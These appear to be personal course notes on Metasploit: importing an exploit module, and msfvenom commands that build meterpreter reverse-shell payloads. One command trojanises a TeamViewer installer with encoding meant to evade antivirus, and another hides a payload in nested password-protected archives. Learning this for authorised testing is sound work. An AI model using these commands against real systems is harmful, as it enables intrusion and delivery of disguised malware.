- [ ] Writing and Importing Modules
![[Pasted image 20250627224252.png]]
```sh
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
# 1
msfconsole -m /usr/share/metasploit-framework/modules/
# 2
msfconsole
msf6> loadpath /usr/share/metasploit-framework/modules/
# 3
msfconsole
msf6 > reload_all
# documentation
https://docs.metasploit.com/api/
https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/
```
- [ ] Introduction To MSFvenom
![[Pasted image 20250627225350.png]]
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
- [ ] Firewalls and IPS/IDS Evasion
Endpoint Protection!!!
![[Pasted image 20250627231743.png]]
Perimeter Protection!!!
![[Pasted image 20250627231801.png]]
```sh
#  a backdoored executable
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
# Archives
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

rar a ~/test.rar -p ~/test.js
mv test.rar test

rar a test2.rar -p test
mv test2.rar test2

rar a test3.rar -p test2
mv test3.rar test3
```
Packers!!!
![[Pasted image 20250630095042.png]]
- [ ] Metasploit-Framework Updates
MSF 6 August 2020
```
1-Generation Features

2-Expanded Encryption

3-Cleaner Payload Artifacts

```
Plugins And Payloads!!!
![[Pasted image 20250630120441.png]]


